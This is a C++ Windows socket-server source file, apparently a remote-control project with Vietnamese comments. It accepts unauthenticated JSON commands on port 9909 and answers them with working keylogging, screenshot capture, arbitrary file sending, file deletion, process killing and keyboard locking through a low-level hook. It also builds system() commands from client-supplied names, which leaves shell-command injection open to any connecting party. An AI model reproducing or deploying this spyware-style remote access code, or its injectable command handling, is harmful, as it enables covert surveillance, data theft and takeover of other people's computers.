#include "lib.h"

HHOOK keyboardHook = nullptr;

WSADATA initializeWinsock() {
    WSADATA ws;
    if (WSAStartup(MAKEWORD(2, 2), &ws) < 0) {
        cout << "WSA failed to initialize" << endl;
    }
    else cout << "WSA initialized" << endl;

    return ws;
}

SOCKET initializeSocket() {
    SOCKET nSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (nSocket < 0) {
        cout << "The Socket not opened" << endl;
    }
    else
        cout << "The Socket opened successfully" << endl;

    return nSocket;
}

sockaddr_in initializeServerSocket() {
    sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_port = htons(9909);
    //server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_addr.s_addr = INADDR_ANY;
    memset(&(server.sin_zero), 0, 8);

    return server;
}

void bindAndListen(SOCKET& nSocket, sockaddr_in& server) {
    int nRet = 0;
    nRet = ::bind(nSocket, (sockaddr*)&server, sizeof(sockaddr));

    if (nRet < 0) {
        cout << "Failed to bind to local port" << endl;
        return;
    }
    else cout << "Successfully bind to local port" << endl;

    // Listen the request from client 
    nRet = listen(nSocket, 5);
    if (nRet < 0) {
        cout << "Failed to start listen to local port" << endl;
    }
    else cout << "Started listening to local port" << endl;
}

SOCKET acceptRequestFromClient(SOCKET nSocket) {
    SOCKET clientSocket;
    sockaddr_in client;
    int clientSize = sizeof(client);

    clientSocket = accept(nSocket, (sockaddr*)&client, &clientSize);

    if (clientSocket < 0) {
        cout << "Failed to accept connection" << endl;
        return EXIT_FAILURE;
    }
    else cout << "Client connected successfully" << endl;

    return clientSocket;
}

bool sendFile(SOCKET& clientSocket, const string& fileName) {
    ifstream file(fileName, ios::binary);

    if (!file) {
        cout << "Failed to open file " << fileName << endl;
        return false;
    }

    string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());

    int fileSize = fileBuffer.size();
    cout << fileSize << endl;

    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    int bytesSent = 0;

    while (bytesSent < fileSize) {
        int bytesToSend = min(fileSize - bytesSent, 1024);
        int result = send(clientSocket, fileBuffer.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send file data, error: " << WSAGetLastError() << endl;
            return false;
        }

        bytesSent += result;
    }

    return true;
}

void sendJSON(SOCKET& clientSocket, const string& jsonResponse) {
    int jsonSize = jsonResponse.size();

    // Gửi kích thước chuỗi JSON trước
    int result = send(clientSocket, reinterpret_cast<char*>(&jsonSize), sizeof(jsonSize), 0);
    if (result == SOCKET_ERROR) {
        cout << "Failed to send JSON size, error: " << WSAGetLastError() << endl;
        return;
    }

    // Gửi nội dung chuỗi JSON
    int bytesSent = 0;
    while (bytesSent < jsonSize) {
        int bytesToSend = min(jsonSize - bytesSent, 1024);
        result = send(clientSocket, jsonResponse.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send JSON data, error: " << WSAGetLastError() << endl;
            break;
        }
        bytesSent += result;
    }
}

void ReceiveAndSend(SOCKET& clientSocket, SOCKET& nSocket) {
    string receiveBuffer, sendBuffer;

    while (true) {
        receiveBuffer.resize(512);

        int recvResult = recv(clientSocket, &receiveBuffer[0], receiveBuffer.size(), 0);

        if (recvResult <= 0) {
            cout << "Failed to receive data from client" << endl;
            break;
        }

        else {
            receiveBuffer.resize(recvResult);

            // Kiểm tra xem có yêu cầu thoát hay không

            if (receiveBuffer == "exit") {
                cout << "Exit command received. Closing connection" << endl;
                break;
            }

            processRequest(clientSocket, receiveBuffer);

        }

    }

    //closeConected(clientSocket, nSocket);
}

void closeConected(SOCKET clientSocket, SOCKET nSocket) {
    // close connected with client
    closesocket(clientSocket);

    // close socket server
    closesocket(nSocket);
    WSACleanup();
}

string startApp(string name) {
    string command = "start " + name;
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "startApp";
    jsonResponse["nameObject"] = name;

    if (result == 0)
        jsonResponse["result"] = "Successfully started " + name;
    else
        jsonResponse["result"] = "Failed to start " + name;

    return jsonResponse.dump();
}

string startService(string name) {
    // Thực thi lệnh để khởi động dịch vụ
    string command = "net start " + name + " > nul 2>&1"; // Ẩn thông báo lỗi CMD
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] == "startService";
    jsonResponse["nameObject"] = name;

    // Nếu lệnh `net start` trả về lỗi, kiểm tra trạng thái dịch vụ
    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        // Dịch vụ khởi động thành công
        jsonResponse["result"] =  "Service " + name + " has been started successfully.";
    }
    else if (system(checkCommand.c_str()) == 0) {
        // Dịch vụ đã chạy trước đó
        jsonResponse["result"] =  "Service " + name + " is already running.";
    }
    else {
        // Không thể khởi động dịch vụ
        jsonResponse["result"] =  "Failed to start service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

string startWebcam() {
    string command = "start microsoft.windows.camera:";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "startWebcam";

    if (result == 0)
        jsonResponse["result"] = "Successfully started webcam";
    else
        jsonResponse["result"] = "Failed to start webcam";

    return jsonResponse.dump();
}

string stopApp(string name) {
    string command = "taskkill /IM " + name + ".exe /F";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "stopApp";
    jsonResponse["nameObject"] = name;

    if (result == 0)
        jsonResponse["result"] = "Successfully stopped " + name;
    else {
        //jsonResponse["result"] = "Failed to stop " + name;
        FILE* pipe = _popen(command.c_str(), "r");
        char buffer[128];
        string line = "";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            line += buffer;  // Đọc từng dòng đầu ra
        }

        jsonResponse["result"] = "The application with name " + name + " is inactive";
    }

    return jsonResponse.dump();
}

string stopService(string name) {
    // Thực thi lệnh để dừng dịch vụ
    string command = "net stop " +name + " > nul 2>&1"; // Ẩn thông báo lỗi CMD
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "stopService";
    jsonResponse["nameObject"] = name;

    // Kiểm tra trạng thái dịch vụ
    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        // Lệnh `net stop` thành công, dịch vụ đã dừng
        jsonResponse["result"] = "Service " + name + " has been stopped successfully.";
    }
    else if (system(checkCommand.c_str()) != 0) {
        // Nếu dịch vụ không chạy
        jsonResponse["result"] = "Service " + name + " is already stopped.";
    }
    else {
        // Lệnh `net stop` không thành công và dịch vụ vẫn đang chạy
        jsonResponse["result"] = "Failed to stop service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

string stopWebcam() {
    string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "stopWebcam";

    if (result == 0)
        jsonResponse["result"] = "Successfully stopped webcam";
    else
        jsonResponse["result"] = "Failed to stop webcam";

    return jsonResponse.dump();
}

string listApps() {
    vector<string> list = createListApps();

    json jsonResponse;

    jsonResponse["title"] = "listApps";

    if (list.size() != 0) {
        jsonResponse["result"] = "Successfully listed applications";
        jsonResponse["content"] = list;
    }
    else
        jsonResponse["result"] = "Failed to list applications";

    return jsonResponse.dump();
}

vector<string> createListApps() {
    string command = "powershell -Command \"gps | where {$_.mainwindowhandle -ne 0} | select-object name\"";

    // Sử dụng hàm _popen để đọc file từ lệnh command ở trên
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Failed to run command." << endl;
        return {};
    }

    // Tạo vector để lưu danh sách các ứng dụng đang hoạt động
    vector<string> listApps;

    // Tạo một buffer để đọc dữ liệu theo từng dòng
    char buffer[256];


    // Đọc dữ liệu bằng stringstream
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        istringstream ss(buffer);
        string appName;

        // Lấy tên ứng dụng ở dòng hiện tại
        ss >> appName;

        // Bỏ qua dòng tiêu đề nếu dòng hiện tại là "Name" hoặc "----"
        if (appName == "Name" || appName == "----") {
            continue;
        }

        // Kiểm tra tên ứng dụng có hợp lệ không
        if (!appName.empty()) {
            listApps.push_back(appName);
        }
    }

    _pclose(pipe);

    return listApps;
}

string listServices() {
    vector<string> list = createListServices();

    json jsonResponse;

    jsonResponse["title"] = "listServices";

    if (list.size() != 0) {
        jsonResponse["result"] = "Successfully listed services";
        jsonResponse["content"] = list;
    }
    else jsonResponse["result"] = "Failed to list services";

    return jsonResponse.dump();
}

vector<string> createListServices() {
    // Lệnh PowerShell để lấy tên của tất cả các tiến trình đang chạy
    string command = "powershell -Command \"Get-Process | Select-Object -ExpandProperty ProcessName\"";

    // Sử dụng hàm _popen để mở pipe và chạy lệnh
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Failed to run command." << endl;
        return {};
    }

    // Tạo set để lưu danh sách các tiến trình duy nhất
    set<string> uniqueProcesses;

    // Tạo một buffer để đọc dữ liệu theo từng dòng
    char buffer[256];

    // Đọc dữ liệu từng dòng
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        istringstream ss(buffer);
        string processName;

        // Lấy tên tiến trình ở dòng hiện tại
        ss >> processName;

        // Kiểm tra tên tiến trình có hợp lệ không
        if (!processName.empty()) {
            uniqueProcesses.insert(processName); // Thêm vào set
        }
    }

    _pclose(pipe);

    // Chuyển đổi set về vector
    vector<string> listProcesses(uniqueProcesses.begin(), uniqueProcesses.end());

    return listProcesses;
}

string shutdown() { // chưa test
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    int result1 = system(command.c_str());

    command = "shutdown /s /t 0";
    int result2 = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "shutdown";

    if (result1 == 0 && result2 == 0)
        jsonResponse["result"] = "Your computer will be shut down";
    else
        jsonResponse["result"] = "Unable to shutdown the computer";

    return jsonResponse.dump();
}

// Thực hiện chức năng restart and shutdown
// Tuy nhiên chưa hoàn thiện nên không cần quan tâm

//void restart(SOCKET& clientSocket) {
//    // Tắt tất cả tiến trình đang chạy
//    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
//    int result1 = system(command.c_str());
//
//    // Tạo JSON phản hồi
//    json jsonResponse;
//    jsonResponse["title"] = "restart";
//
//    if (result1 == 0)
//        jsonResponse["result"] = "Your computer will be restarted.";
//    else
//        jsonResponse["result"] = "Unable to stop running processes.";
//
//    // Gửi JSON phản hồi trước khi khởi động lại
//    sendJSON(clientSocket, jsonResponse.dump());
//
//    // Khởi động lại máy tính sau khi gửi JSON
//    command = "shutdown /r /t 0";
//    system(command.c_str());
//}


//string restart() { // chưa test
//    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
//    int result1 = system(command.c_str());
//
//    command = "shutdown /r /t 0";
//    int result2 = system(command.c_str());
//
//    json jsonResponse;
//
//    jsonResponse["title"] = "restart";
//
//    if (result1 == 0 && result2 == 0)
//        jsonResponse["result"] = "Your computer will be restart";
//    else
//        jsonResponse["result"] = "Unable to restart the computer";
//
//    return jsonResponse.dump();
//}

// Delete file
string deleteFile(string& filePath) {
    json jsonResponse;

    jsonResponse["title"] = "deleteFile";

    if (remove(filePath.c_str()) == 0) {
        jsonResponse["result"] = "File has been successfully deleted!";
    }
    else {
        jsonResponse["result"] = "Failed to delete file";
    }

    return jsonResponse.dump();
}

// Copy file
string copyFile(string sourceFile, string destinationFile) {
    ifstream source(sourceFile, ios::binary);

    json jsonResponse;

    jsonResponse["title"] = "Copy file";

    if (!source) {
        jsonResponse["result"] = "Source file does not exist or could not be opened!";
        return jsonResponse.dump();
    }
    
    ofstream destination(destinationFile, ios::binary);

    if (!destination) {
        jsonResponse["result"] = "Could not create destination file!";
        return jsonResponse.dump();
    }

    destination << source.rdbuf();

    jsonResponse["result"] = "File copied successfully!";

    return jsonResponse.dump();
}

// Screenshot

// Hàm tạo tên tệp với thời gian hiện tại
string generateFileName() {
    time_t now = time(0);
    tm localtime;
    localtime_s(&localtime, &now);

    stringstream ss;
    ss << "screenshot_"
        << 1900 + localtime.tm_year << "-"
        << 1 + localtime.tm_mon << "-"
        << localtime.tm_mday << "_"
        << localtime.tm_hour << "-"
        << localtime.tm_min << "-"
        << localtime.tm_sec << ".bmp";

    return ss.str();
}

// Hàm chụp ảnh màn hình và lưu vào HBITMAP
HBITMAP captureScreen(int& screenWidth, int& screenHeight) {
    HWND hwndDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hwndDesktop);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    RECT screenRect;
    GetWindowRect(hwndDesktop, &screenRect);
    screenWidth = screenRect.right;
    screenHeight = screenRect.bottom;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    ReleaseDC(hwndDesktop, hdcScreen);
    DeleteDC(hdcMem);

    return hBitmap;
}

// Hàm lưu HBITMAP vào tệp BMP với tên duy nhất
bool saveHBitmapToBMP(HBITMAP hBitmap, int width, int height, const string& folderPath) {
    string fileName = folderPath + "\\" + generateFileName();

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER infoHeader;

    fileHeader.bfType = 0x4D42;  // Chữ "BM"
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileHeader.bfSize = fileHeader.bfOffBits + bmp.bmWidthBytes * height;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    infoHeader.biSize = sizeof(BITMAPINFOHEADER);
    infoHeader.biWidth = width;
    infoHeader.biHeight = height;
    infoHeader.biPlanes = 1;
    infoHeader.biBitCount = 32; // 32 bpp
    infoHeader.biCompression = BI_RGB;
    infoHeader.biSizeImage = bmp.bmWidthBytes * height;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed = 0;
    infoHeader.biClrImportant = 0;

    ofstream outFile(fileName, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Error: Failed to save BMP file!" << endl;
        return false;
    }

    outFile.write(reinterpret_cast<const char*>(&fileHeader), sizeof(fileHeader));
    outFile.write(reinterpret_cast<const char*>(&infoHeader), sizeof(infoHeader));

    HDC hdc = GetDC(NULL);
    BYTE* bmpData = new BYTE[bmp.bmWidthBytes * height];
    GetDIBits(hdc, hBitmap, 0, height, bmpData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    outFile.write(reinterpret_cast<const char*>(bmpData), bmp.bmWidthBytes * height);
    delete[] bmpData;

    outFile.close();
    cout << "Successfully saved the screenshot to the file:  " << fileName << endl;
    return true;
}

// Hàm chuyển đổi chuỗi nhị phân thành tệp BMP và lưu vào thư mục Downloads
bool saveBinaryToImage(const string& binaryData, const string& savePath) {
    // Mở tệp nhị phân để ghi dữ liệu vào tệp hình ảnh
    ofstream outFile(savePath, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Error: Cannot open file to save!" << endl;
        return false;
    }

    // Ghi dữ liệu vào tệp
    outFile.write(binaryData.c_str(), binaryData.size());
    outFile.close();

    cout << "Image has been saved to the file: " << savePath << endl;
    return true;
}


string screenShot() {
    int screenWidth, screenHeight;

    // Chụp ảnh màn hình
    HBITMAP hBitmap = captureScreen(screenWidth, screenHeight);
    if (!hBitmap) {
        cout << "Failed to screenshot!";
        return "";
    }

    // Thư mục lưu ảnh chụp màn hình
    const string folderPath = "D:\\test screenshot server";

    string bmpFilePath = folderPath + "\\" + generateFileName();

    // Lưu ảnh chụp màn hình vào tệp BMP
    if (!saveHBitmapToBMP(hBitmap, screenWidth, screenHeight, folderPath)) {
        cout << "Failed to screenshot!" << endl;
        DeleteObject(hBitmap);
        return "";
    }

    // // Giải phóng tài nguyên
    DeleteObject(hBitmap);

    return bmpFilePath;
}

// Key locking

// Hàm callback để chặn bàn phím
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        return 1; // Chặn tất cả các phím bấm
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Hàm khóa bàn phím
bool LockKeyboard() {
    // Cài đặt hook để chặn bàn phím
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        std::cerr << "Failed to lock the keyboard." << std::endl; // Thông báo lỗi
        return false;
    }

    std::cout << "The keyboard has been locked." << std::endl; // Thông báo thành công

    // Lưu thông tin hook ID vào Registry
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\KeyboardLock", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\KeyboardLock", &hKey); // Tạo key nếu chưa tồn tại
    }

    uintptr_t hookID = reinterpret_cast<uintptr_t>(keyboardHook);
    RegSetValueExW(hKey, L"HookID", 0, REG_QWORD, (BYTE*)&hookID, sizeof(hookID)); // Lưu hook ID
    RegCloseKey(hKey); // Đóng Registry key

    return true; // Trả về true nếu thành công
}

string solveKeyLockingAndSend(bool& flag) {
    json jsonResponse;

    jsonResponse["title"] = "keyLocking";

    if (LockKeyboard()) {
        jsonResponse["result"] = "Successfully locked the keyboard";
        flag = 1;
    }
    else {
        jsonResponse["result"] = "Failed to lock the key";
        flag = 0;
    }

    return jsonResponse.dump();
}

void runKeyLockingLoop() {
    // Vòng lặp xử lý thông điệp để chương trình hoạt động liên tục
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


// keyUnlocking

string UnlockKeyboard() {

    json jsonResponse;

    jsonResponse["title"] = "keyUnlocking";

    // Đọc hook ID từ Registry
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\KeyboardLock", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        uintptr_t hookID;
        DWORD dataSize = sizeof(hookID);

        // Sử dụng chuỗi Unicode cho "HookID"
        if (RegGetValueW(hKey, NULL, L"HookID", RRF_RT_QWORD, NULL, &hookID, &dataSize) == ERROR_SUCCESS) {
            HHOOK keyboardHook = reinterpret_cast<HHOOK>(hookID);

            // Gỡ bỏ hook bàn phím
            if (UnhookWindowsHookEx(keyboardHook)) {
                jsonResponse["result"] = "The keyboard has been unlocked.\n";
                RegCloseKey(hKey);
            }
            else {
                jsonResponse["result"] = "Failed to unlock the keyboard.\n";
            }
        }
        else {
            jsonResponse["result"] = "Hook ID not found in the Registry.\n";
        }

        // Đóng Registry
        RegCloseKey(hKey);
    }
    else {
        jsonResponse["result"] = "Unable to access the Registry.\n";
    }

    return jsonResponse.dump();
}



// Key logger

// Bảng ánh xạ mã phím sang tên phím
map<int, string> createKeyMap() {
    map<int, string> keyMap;

    // Các phím chữ cái
    for (char c = 'A'; c <= 'Z'; ++c) keyMap[c] = string(1, c);

    // Các phím số
    for (char c = '0'; c <= '9'; ++c) keyMap[c] = string(1, c);

    // Các phím chức năng
    keyMap[VK_F1] = "F1";    keyMap[VK_F2] = "F2";    keyMap[VK_F3] = "F3";
    keyMap[VK_F4] = "F4";    keyMap[VK_F5] = "F5";    keyMap[VK_F6] = "F6";
    keyMap[VK_F7] = "F7";    keyMap[VK_F8] = "F8";    keyMap[VK_F9] = "F9";
    keyMap[VK_F10] = "F10";  keyMap[VK_F11] = "F11";  keyMap[VK_F12] = "F12";

    // Các phím điều khiển
    keyMap[VK_SHIFT] = "Shift";
    keyMap[VK_CONTROL] = "Ctrl";
    keyMap[VK_MENU] = "Alt";
    keyMap[VK_SPACE] = "Space";
    keyMap[VK_RETURN] = "Enter";
    keyMap[VK_BACK] = "Backspace";
    keyMap[VK_TAB] = "Tab";
    keyMap[VK_ESCAPE] = "Esc";
    keyMap[VK_CAPITAL] = "Caps Lock";   // Caps Lock
    keyMap[VK_NUMLOCK] = "Num Lock";   // Num Lock
    keyMap[VK_LWIN] = "Left Windows";   // Left Windows Key
    keyMap[VK_RWIN] = "Right Windows";  // Right Windows Key

    // Các phím mũi tên
    keyMap[VK_LEFT] = "Left Arrow";
    keyMap[VK_RIGHT] = "Right Arrow";
    keyMap[VK_UP] = "Up Arrow";
    keyMap[VK_DOWN] = "Down Arrow";

    // Các phím đặc biệt khác
    keyMap[VK_DELETE] = "Delete";
    keyMap[VK_INSERT] = "Insert";
    keyMap[VK_HOME] = "Home";
    keyMap[VK_END] = "End";
    keyMap[VK_PRIOR] = "Page Up";
    keyMap[VK_NEXT] = "Page Down";

    // Các ký tự đặc biệt
    keyMap[0xBD] = "-"; keyMap[0xBB] = "="; keyMap[0xDB] = "["; keyMap[0xDD] = "]";
    keyMap[0xDC] = "\\"; keyMap[0xBA] = ";"; keyMap[0xDE] = "'"; keyMap[0xBC] = ",";
    keyMap[0xBE] = "."; keyMap[0xBF] = "/"; keyMap[0xC0] = "`";
    keyMap[0x30] = "0"; keyMap[0x31] = "1"; keyMap[0x32] = "2"; keyMap[0x33] = "3";
    keyMap[0x34] = "4"; keyMap[0x35] = "5"; keyMap[0x36] = "6"; keyMap[0x37] = "7";
    keyMap[0x38] = "8"; keyMap[0x39] = "9";

    // Các phím NumPad
    keyMap[VK_NUMPAD0] = "NumPad 0";
    keyMap[VK_NUMPAD1] = "NumPad 1";
    keyMap[VK_NUMPAD2] = "NumPad 2";
    keyMap[VK_NUMPAD3] = "NumPad 3";
    keyMap[VK_NUMPAD4] = "NumPad 4";
    keyMap[VK_NUMPAD5] = "NumPad 5";
    keyMap[VK_NUMPAD6] = "NumPad 6";
    keyMap[VK_NUMPAD7] = "NumPad 7";
    keyMap[VK_NUMPAD8] = "NumPad 8";
    keyMap[VK_NUMPAD9] = "NumPad 9";
    keyMap[VK_DECIMAL] = "NumPad .";
    keyMap[VK_DIVIDE] = "NumPad /";
    keyMap[VK_MULTIPLY] = "NumPad *";
    keyMap[VK_SUBTRACT] = "NumPad -";
    keyMap[VK_ADD] = "NumPad +";
    keyMap[VK_NUMLOCK] = "Num Lock";

    return keyMap;
}

// Hàm thu thập và trả về tên các phím được nhấn
vector<string> collectKeyNames(int durationInSeconds) {
    map<int, string> keyMap = createKeyMap(); // Tạo bảng ánh xạ mã phím
    vector<string> keyNames;  // Lưu trữ tên các phím đã nhấn
    bool keyState[256] = { false }; // Trạng thái trước đó của các phím

    auto startTime = GetTickCount64(); // Lấy thời gian bắt đầu (milliseconds)
    cout << "Started collecting keys (Duration: " << durationInSeconds << " seconds):" << endl;

    while ((GetTickCount64() - startTime) / 1000 < durationInSeconds) {
        for (int key = 0; key < 256; ++key) { // Duyệt qua tất cả các mã phím
            bool isPressed = GetAsyncKeyState(key) & 0x8000; // Kiểm tra nếu phím được nhấn

            // Kiểm tra trạng thái phím điều khiển
            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // Bỏ qua phím chuột

            if (isPressed && !keyState[key]) { // Nếu phím vừa được nhấn (chưa nhấn trước đó)
                keyState[key] = true; // Cập nhật trạng thái

                if (keyMap.find(key) != keyMap.end()) { // Nếu mã phím có trong bảng ánh xạ
                    keyNames.push_back(keyMap[key]);
                    cout << "Key pressed: " << keyMap[key] << endl;  // "Phím được nhấn"
                }
            }
            else if (!isPressed) { // Nếu phím không còn nhấn
                keyState[key] = false; // Reset trạng thái
            }
        }
        Sleep(10); // Giảm tải CPU
    }

    cout << "Finished collecting keys!" << endl;  // "Kết thúc thu thập phím!"
    return keyNames; // Trả về danh sách các phím đã nhấn
}

string keyLogger(int durationInSeconds) {
    json jsonResponse;

    jsonResponse["title"] = "keyLogger";

    vector<string> keyNames = collectKeyNames(durationInSeconds);

    jsonResponse["content"] = keyNames;

    if (keyNames.size() == 0) {
        jsonResponse["result"] = "Failed to collect keys";
    }
    else {
        jsonResponse["result"] = "Key logger successfully";
    }

    return jsonResponse.dump();
}


void processRequest(SOCKET& clientSocket, string jsonRequest) {
    // Tạo đối tượng JSON từ chuỗi JSON
    json j = json::parse(jsonRequest);

    string jsonResponse = "";

    if (j.contains("title")) {
        if (j.at("title") == "listApps") {
            jsonResponse = listApps();
            sendJSON(clientSocket, jsonResponse);
        }
        else if (j.at("title") == "listServices") {
            jsonResponse = listServices();
            sendJSON(clientSocket, jsonResponse);

        }
        else if (j.at("title") == "startApp") {
            if (j.contains("nameObject")) {
                jsonResponse = startApp(j.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (j.at("title") == "startService") {
            if (j.contains("nameObject")) {
                jsonResponse = startService(j.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (j.at("title") == "stopApp") {
            if (j.contains("nameObject")) {
                jsonResponse = stopApp(j.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (j.at("title") == "stopService") {
            if (j.contains("nameObject")) {
                jsonResponse = stopService(j.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (j.at("title") == "restart") {
           // jsonResponse = restart();
            sendJSON(clientSocket, jsonResponse);
        }
        else if (j.at("title") == "shutdown") {
            //jsonResponse = shutdown();
            sendJSON(clientSocket, jsonResponse);
        }
        else if (j.at("title") == "startWebcam") {
            jsonResponse = startWebcam();
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "stopWebcam") {
            jsonResponse = stopWebcam();
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "screenShot") {
            string filePath = screenShot();
            json j;

            j["title"] = "screenShot";

            if (sendFile(clientSocket, filePath)) {
                j["result"] = "Successfully screenshot";
            }
            else {
                j["result"] = "Failed to screenshot";
            }

            jsonResponse = j.dump();
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "sendFile") {
            json temp;

            string fileName = j.at("nameObject");

            j["title"] = "sendFile";


            if (sendFile(clientSocket, fileName)) {
                temp["result"] = "File copied and sent successfully";
            }
            else {
                temp["result"] = "Failed to copy file and send it";
            }

            jsonResponse = temp.dump();
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "copyFile") {
            jsonResponse = copyFile(j.at("source"), j.at("destination"));
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "deleteFile") {
            string filePath = j.at("nameObject");

            jsonResponse = deleteFile(filePath);
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "keyLogger") {
            string t = j.at("nameObject");
            int duration = stoi(t);

            jsonResponse = keyLogger(duration);
            sendJSON(clientSocket, jsonResponse);
        }

        else if (j.at("title") == "keyLocking") {
            bool flag;
            jsonResponse = solveKeyLockingAndSend(flag); 
            sendJSON(clientSocket, jsonResponse);
            if (flag) runKeyLockingLoop();
        }

        else if (j.at("title") == "keyUnlocking") {
            jsonResponse = UnlockKeyboard();
            sendJSON(clientSocket, jsonResponse);
        }

        else {
            json temp;

            temp["title"] = "Error";
            temp["result"] = "Your request is invalid. Please review and resend it";

            jsonResponse = temp.dump();
            sendJSON(clientSocket, jsonResponse);

        }
    }
}
